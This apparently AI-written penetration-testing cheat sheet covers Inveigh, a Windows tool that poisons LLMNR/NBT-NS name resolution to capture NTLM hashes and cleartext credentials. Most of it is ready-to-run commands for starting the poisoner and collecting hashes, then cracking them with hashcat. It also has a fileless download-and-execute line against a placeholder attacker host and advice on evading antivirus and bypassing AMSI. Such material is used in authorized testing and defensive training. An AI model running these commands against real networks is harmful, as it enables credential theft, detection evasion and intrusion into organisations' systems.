# Inveigh

**Tags:** `#inveigh` `#llmnr` `#nbns` `#ntlmcapture` `#poisoning` `#lateral` `#activedirectory` `#windows`

Windows-side LLMNR/NBT-NS/mDNS poisoner — the Responder equivalent for when you're already on a Windows foothold. Available as a C# binary (`Inveigh.exe`) and a legacy PowerShell module. Captures NTLMv1/v2 hashes from other hosts on the network without needing Linux. Also supports IPv6 and HTTPS capture.

**Source:** https://github.com/Kevin-Robertson/Inveigh
**Install:** Download pre-compiled `Inveigh.exe` or use PowerShell version

```powershell
# C# version — run from Windows foothold
.\Inveigh.exe

# PowerShell version
Import-Module .\Inveigh.ps1
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

> [!note] **Inveigh vs Responder** — Same attack, different platform. Responder runs on Kali. Inveigh runs on a Windows foothold inside the network. Use Inveigh when you have a Windows shell but no way to route Kali traffic to the target segment.

---

## C# Version (Inveigh.exe)

```powershell
# Basic start — LLMNR + NBNS poisoning
.\Inveigh.exe

# LLMNR only
.\Inveigh.exe -LLMNR Y -NBNS N

# With file output
.\Inveigh.exe -FileOutput Y -OutputDir C:\Windows\Temp\

# Specify interface
.\Inveigh.exe -IP 192.168.1.100

# WPAD proxy capture
.\Inveigh.exe -WPADAUTH Y

# Inspect captured data (interactive console — press ESC)
# GET NTLMV2UNIQUE        — unique NTLMv2 hashes
# GET NTLMV2USERNAMES     — usernames with captured hashes
# GET CLEARTEXT           — any cleartext credentials
# HELP                    — all commands
```

**Interactive console commands:**

```
GET NTLMV2UNIQUE         # unique NTLMv2 hashes (for hashcat)
GET NTLMV2USERNAMES      # list of users captured
GET CLEARTEXT            # plaintext credentials
GET LOG                  # full activity log
STOP                     # stop all listeners
EXIT                     # exit
```

---

## PowerShell Version (legacy)

```powershell
# Import module
Import-Module .\Inveigh.ps1

# Start — LLMNR + NBNS + output
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y

# With WPAD
Invoke-Inveigh -LLMNR Y -NBNS Y -WPADAUTH Y -ConsoleOutput Y

# Quiet mode (background capture)
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput N -FileOutput Y

# Get captured hashes after run
Get-Inveigh -NTLMv2
Get-Inveigh -NTLMv2Unique
Get-Inveigh -Log

# Stop
Stop-Inveigh
```

---

## Captured Hash Output

```powershell
# C# — from interactive console
GET NTLMV2UNIQUE

# Output saved to files (if -FileOutput Y):
# Inveigh-NTLMv2.txt    — NTLMv2 hashes
# Inveigh-Log.txt       — activity log
# Inveigh-Cleartext.txt — any plaintext

# PowerShell — retrieve after stopping
Get-Inveigh -NTLMv2Unique | Out-File C:\Windows\Temp\hashes.txt
```

```bash
# Transfer hashes to Kali and crack
# From evil-winrm:
download C:\Windows\Temp\Inveigh-NTLMv2.txt

# Crack NTLMv2 — hashcat mode 5600
hashcat -m 5600 Inveigh-NTLMv2.txt /usr/share/wordlists/rockyou.txt
```

---

## In-Memory Execution

```powershell
# Download and run without touching disk (C# version via execute-assembly)
execute-assembly Inveigh.exe

# PowerShell version — IEX
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Inveigh.ps1')
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

---

## OPSEC Notes

- Same detection risk as Responder — LLMNR/NBNS poisoning is well-monitored in mature environments
- `Inveigh.exe` will be flagged by most AV — use execute-assembly or obfuscated build
- PowerShell version triggers AMSI on default systems — bypass AMSI before loading
- File output writes hashes to disk — use in-memory only (`ConsoleOutput Y -FileOutput N`) when OPSEC matters

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
